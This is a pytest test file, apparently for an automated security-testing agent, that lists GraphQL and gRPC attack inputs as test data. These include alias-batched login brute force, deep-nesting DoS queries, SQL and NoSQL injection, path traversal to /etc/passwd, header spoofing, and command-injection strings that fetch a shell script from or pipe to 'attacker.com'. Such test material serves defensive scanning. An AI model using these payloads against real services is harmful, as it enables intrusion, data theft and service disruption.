"""Unit tests for GraphQL and gRPC deep security testing."""

import pytest
import json
from unittest.mock import patch, MagicMock, Mock


class TestGraphQLEndpointDetection:
    """Test GraphQL endpoint discovery and introspection."""

    def test_graphql_endpoint_patterns(self):
        """Common GraphQL endpoint paths."""
        patterns = [
            "/graphql",
            "/api/graphql",
            "/graphql/v1",
            "/query",
            "/gql",
            "/api/v1/graphql",
        ]
        # Each should be tested by agent
        assert len(patterns) >= 3

    def test_introspection_query_format(self):
        """Standard GraphQL introspection query."""
        introspection_query = {
            "query": "{__schema{types{name fields{name type{name kind ofType{name}}}}}}"
        }
        assert "query" in introspection_query
        assert "__schema" in introspection_query["query"]

    def test_schema_extraction_from_introspection(self):
        """Parse introspection response to extract schema."""
        introspection_response = {
            "data": {
                "__schema": {
                    "types": [
                        {
                            "name": "Query",
                            "fields": [
                                {"name": "user", "type": {"name": "User"}},
                                {"name": "posts", "type": {"name": "[Post]"}},
                            ],
                        },
                        {
                            "name": "User",
                            "fields": [
                                {"name": "id", "type": {"name": "ID"}},
                                {"name": "email", "type": {"name": "String"}},
                                {"name": "password", "type": {"name": "String"}},
                            ],
                        },
                    ]
                }
            }
        }

        schema = introspection_response["data"]["__schema"]
        assert len(schema["types"]) >= 1

        # Find sensitive fields
        user_type = next((t for t in schema["types"] if t["name"] == "User"), None)
        assert user_type is not None
        field_names = [f["name"] for f in user_type["fields"]]
        assert "email" in field_names or "password" in field_names

    def test_deprecated_field_detection(self):
        """Identify deprecated fields still accessible."""
        field_with_deprecation = {
            "name": "oldLoginMethod",
            "type": {"name": "String"},
            "isDeprecated": True,
            "deprecationReason": "Use newLoginMethod instead",
        }

        # Deprecated fields can be security risks
        assert field_with_deprecation.get("isDeprecated") is True

    def test_sensitive_field_identification(self):
        """Detect fields that expose sensitive data."""
        sensitive_patterns = ["password", "token", "secret", "apikey", "ssn", "creditcard", "email"]

        schema_fields = [
            "id",
            "username",
            "email",
            "password_hash",
            "api_token",
            "ssn",
            "phone",
            "creditCardNumber",
        ]

        sensitive_fields = [
            f for f in schema_fields if any(p in f.lower() for p in sensitive_patterns)
        ]

        assert len(sensitive_fields) >= 3
        assert "email" in sensitive_fields


class TestGraphQLComplexityAndDepthAttacks:
    """Test DoS attacks via query complexity and depth."""

    def test_query_depth_escalation(self):
        """Deeply nested queries to trigger resource exhaustion."""
        nested_query = {
            "query": "{users{posts{comments{author{posts{comments{author{id}}}}}}}"
        }
        assert "{users" in nested_query["query"]
        assert nested_query["query"].count("{") == nested_query["query"].count("}")

    def test_large_batch_query(self):
        """Batching multiple queries in array syntax."""
        batch_queries = [
            {"query": f"query Q{i} {{ user(id: {i}) {{ email }} }}"}
            for i in range(100)
        ]
        assert len(batch_queries) == 100
        assert all("user(id:" in q["query"] for q in batch_queries)

    def test_alias_batching_for_rate_limit_bypass(self):
        """Multiple aliases bypass per-query rate limits."""
        alias_query = {
            "query": "{ "
            + " ".join(
                f'a{i}:login(user:"admin",pass:"attempt{i}") '
                for i in range(50)
            )
            + "}"
        }
        assert "a0:login" in alias_query["query"]
        assert "a49:login" in alias_query["query"]
        # Single HTTP request, 50 login attempts
        assert alias_query["query"].count("login") == 50

    def test_typename_padding_for_complexity(self):
        """Use __typename to pad complexity scores."""
        padded_query = {
            "query": "{ "
            + " ".join(
                f'u{i}:user(id:{i}) {{ id __typename '
                + "".join(f"{{ __typename }}" for _ in range(5))
                + "}} "
                for i in range(20)
            )
            + "}"
        }
        assert padded_query["query"].count("__typename") > 20


class TestGraphQLAuthorizationBypass:
    """Test field-level authorization and IDOR attacks."""

    def test_horizontal_privilege_escalation_nested(self):
        """Access other users' data through nested queries."""
        idor_query = {
            "query": """
            {
                post(id: 1) {
                    author {
                        email
                        phone
                        ssn
                        paymentMethods {
                            cardNumber
                        }
                    }
                }
            }
            """
        }
        assert "author" in idor_query["query"]
        assert "email" in idor_query["query"]
        assert "ssn" in idor_query["query"]

    def test_vertical_privilege_escalation(self):
        """Access admin-only fields through nested relationships."""
        escalation_query = {
            "query": """
            {
                me {
                    organization {
                        allUsers {
                            role
                            permissions
                            apiKey
                        }
                    }
                }
            }
            """
        }
        assert "allUsers" in escalation_query["query"]
        assert "permissions" in escalation_query["query"]
        assert "apiKey" in escalation_query["query"]

    def test_over_fetching_all_fields(self):
        """Request all fields on a type and check for unintended disclosure."""
        over_fetch_query = {
            "query": """
            {
                user(id: 1) {
                    id
                    username
                    email
                    password
                    role
                    apiKey
                    createdAt
                    deletedAt
                    internalNotes
                }
            }
            """
        }
        assert "password" in over_fetch_query["query"]
        assert "apiKey" in over_fetch_query["query"]
        # These fields should not be exposed
        assert "internalNotes" in over_fetch_query["query"]


class TestGraphQLInjectionAttacks:
    """Test injection vulnerabilities through GraphQL."""

    def test_sql_injection_via_variables(self):
        """SQL injection through GraphQL variables."""
        sql_injection = {
            "query": "query($id: String!) { user(id: $id) { name } }",
            "variables": {"id": "1' OR '1'='1"},
        }
        assert "variables" in sql_injection
        assert "OR '1'='1" in sql_injection["variables"]["id"]

    def test_nosql_injection_operators(self):
        """NoSQL injection using MongoDB operators."""
        nosql_injection = {
            "query": "query($filter: Object!) { users(filter: $filter) { id } }",
            "variables": {"filter": {"$gt": ""}},
        }
        assert "$gt" in str(nosql_injection["variables"])

    def test_command_injection_via_file_path(self):
        """Path traversal or command injection."""
        path_injection = {
            "query": """
            query($path: String!) {
                readFile(path: $path) {
                    content
                }
            }
            """,
            "variables": {"path": "../../../../etc/passwd"},
        }
        assert "../../../../" in path_injection["variables"]["path"]

    def test_unicode_bypass_for_injection_filters(self):
        """Unicode encoding to bypass input filters."""
        unicode_query = {
            "query": "query { search(q: \"test\\u0027 OR 1=1--\") { results } }",
        }
        # Double quote might be filtered; unicode escape is not
        assert "\\u0027" in unicode_query["query"]


class TestgRPCServiceDiscovery:
    """Test gRPC service enumeration and reflection."""

    def test_grpc_reflection_discovery(self):
        """List all gRPC services via reflection."""
        reflection_commands = [
            "grpcurl -plaintext {target}:{port} list",
            "grpcurl -plaintext {target}:{port} list ServiceName",
            "grpcurl -plaintext {target}:{port} describe ServiceName.Method",
        ]
        assert len(reflection_commands) == 3
        assert all("grpcurl" in cmd for cmd in reflection_commands)

    def test_common_grpc_ports(self):
        """Standard ports where gRPC services run."""
        common_grpc_ports = [50051, 9090, 8080, 443]
        assert 50051 in common_grpc_ports  # gRPC default
        assert 443 in common_grpc_ports  # TLS-enabled

    def test_grpc_http2_detection(self):
        """Identify gRPC services by HTTP/2 protocol and content-type."""
        http2_indicators = [
            "content-type: application/grpc",
            "h2 (ALPN)",
            "HTTP/2.0",
        ]
        assert any("grpc" in i for i in http2_indicators)
        assert any("h2" in i for i in http2_indicators)

    def test_proto_file_discovery(self):
        """Search for .proto files and documentation."""
        discovery_paths = [
            "/.proto",
            "/protos",
            "/api/proto",
            "/proto/",
            "/schema.proto",
        ]
        assert len(discovery_paths) >= 3


class TestgRPCMessageFuzzing:
    """Test gRPC message handling and fuzzing."""

    def test_unary_rpc_boundary_values(self):
        """Fuzz individual fields with edge case values."""
        boundary_values = [-1, 0, 999999999, -2147483648, 2147483647]
        # Test each against gRPC methods
        assert any(v < 0 for v in boundary_values)
        assert any(v > 1000000 for v in boundary_values)

    def test_required_field_omission(self):
        """Send messages without required fields."""
        minimal_message = {}
        # Should fail if validation is enforced
        assert len(minimal_message) == 0

    def test_wrong_field_types(self):
        """Send string when int expected, etc."""
        type_confusion_cases = [
            {"user_id": "not_an_int"},  # Should be int
            {"count": "abc"},  # Should be int
            {"enabled": "yes"},  # Should be bool
        ]
        assert len(type_confusion_cases) == 3

    def test_streaming_rpc_resource_exhaustion(self):
        """Client streaming with large number of messages."""
        # Simulate sending 10000 messages in one stream
        message_count = 10000
        assert message_count > 100  # Significant amount

    def test_bidirectional_stream_malformed_frames(self):
        """Send malformed frames mid-stream in bidirectional calls."""
        # Malformed protobuf wire format
        malformed_cases = [
            "field_number_0_invalid",
            "large_field_number_exceeds_limit",
            "mixed_wire_types",
        ]
        assert len(malformed_cases) >= 2


class TestgRPCAuthenticationBypass:
    """Test authentication and authorization in gRPC."""

    def test_unauthenticated_admin_method_access(self):
        """Call admin methods without authentication."""
        admin_call = {
            "service": "AdminService",
            "method": "GetAllUsers",
            "metadata": {},  # No auth headers
        }
        assert len(admin_call["metadata"]) == 0
        # Should fail but might not if auth is missing

    def test_metadata_injection_for_privilege_escalation(self):
        """Inject custom metadata to manipulate authorization."""
        metadata_injection_cases = [
            {"authorization": "Bearer manipulated_token"},
            {"x-user-id": "0"},
            {"x-role": "admin"},
            {"x-forwarded-for": "127.0.0.1"},  # Spoof internal IP
        ]
        assert len(metadata_injection_cases) >= 3

    def test_jwt_algorithm_confusion(self):
        """Manipulate JWT algorithm (RS256 → HS256)."""
        # Attacker-controlled token with algorithm downgrade
        jwt_confusion = {
            "original_header": {"alg": "RS256", "kid": "2021-05-05"},
            "confused_header": {"alg": "HS256", "kid": "2021-05-05"},
        }
        assert jwt_confusion["original_header"]["alg"] != jwt_confusion["confused_header"]["alg"]

    def test_tls_bypass_plaintext_fallback(self):
        """Accept plaintext h2c when TLS is expected."""
        protocol_tests = [
            ("https://grpc.example.com:443", "expect TLS"),
            ("http://grpc.example.com:50051", "expect plaintext"),
        ]
        assert len(protocol_tests) == 2


class TestgRPCInjectionAttacks:
    """Test injection attacks in gRPC messages."""

    def test_sql_injection_in_string_fields(self):
        """SQL injection in proto string fields."""
        sql_injection_payload = {
            "username": "' OR '1'='1",
            "search": "'; DROP TABLE users; --",
        }
        assert "OR" in sql_injection_payload["username"]
        assert "DROP" in sql_injection_payload["search"]

    def test_path_traversal_in_file_operations(self):
        """Path traversal via file fields."""
        path_traversal = {
            "method": "ReadFile",
            "path": "../../../../etc/passwd",
        }
        assert "../" in path_traversal["path"]

    def test_command_execution_vectors(self):
        """Command injection if gRPC processes system commands."""
        command_injection_cases = [
            {"command": "ls; cat /etc/passwd"},
            {"script": "$(curl attacker.com/shell.sh)"},
            {"file": "| nc attacker.com 1234"},
        ]
        assert any(";" in str(c) for c in command_injection_cases)


class TestGraphQLgRPCIntegration:
    """Integration scenarios combining GraphQL and gRPC."""

    def test_api_migration_detection(self):
        """Detect services with both GraphQL and gRPC endpoints."""
        hybrid_service = {
            "graphql_endpoints": ["/graphql", "/api/graphql"],
            "grpc_services": ["UserService", "PostService"],
        }
        assert len(hybrid_service["graphql_endpoints"]) >= 1
        assert len(hybrid_service["grpc_services"]) >= 1

    def test_protocol_downgrade_attack(self):
        """Test if GraphQL can perform operations locked to gRPC."""
        # Same business logic might exist in both protocols
        attack_scenario = {
            "graphql_blocked": False,
            "grpc_blocked": True,
            "vulnerability": "Protocol downgrade to GraphQL",
        }
        if not attack_scenario["graphql_blocked"] and attack_scenario["grpc_blocked"]:
            # GraphQL accessible, gRPC not — potential downgrade
            pass

    def test_schema_synchronization_issues(self):
        """Check if GraphQL and gRPC schemas diverge."""
        # Same operation might be exposed differently
        graphql_fields = ["user", "posts", "comments"]
        grpc_methods = ["GetUser", "ListPosts", "GetComments"]

        # If one exposes more than the other, that's a risk
        assert len(graphql_fields) > 0
        assert len(grpc_methods) > 0


class TestKnowledgeBase:
    """Verify GraphQL and gRPC knowledge modules are available."""

    def test_graphql_knowledge_module_exists(self):
        """GraphQL testing knowledge module should be available."""
        import os
        graphql_kb = os.path.exists(
            "modules/agent/prompts/knowledge/graphql_testing.txt"
        )
        assert graphql_kb is True

    def test_grpc_knowledge_module_exists(self):
        """gRPC testing knowledge module should be available."""
        import os
        grpc_kb = os.path.exists("modules/agent/prompts/knowledge/grpc_testing.txt")
        assert grpc_kb is True

    def test_knowledge_modules_loaded_on_discovery(self):
        """Agent should load appropriate knowledge when GraphQL/gRPC detected."""
        scan_context = {
            "graphql_found": True,
            "grpc_found": False,
            "knowledge_to_load": ["graphql_testing"],
        }
        if scan_context["graphql_found"]:
            assert "graphql_testing" in scan_context["knowledge_to_load"]

        scan_context2 = {
            "graphql_found": False,
            "grpc_found": True,
            "knowledge_to_load": ["grpc_testing"],
        }
        if scan_context2["grpc_found"]:
            assert "grpc_testing" in scan_context2["knowledge_to_load"]
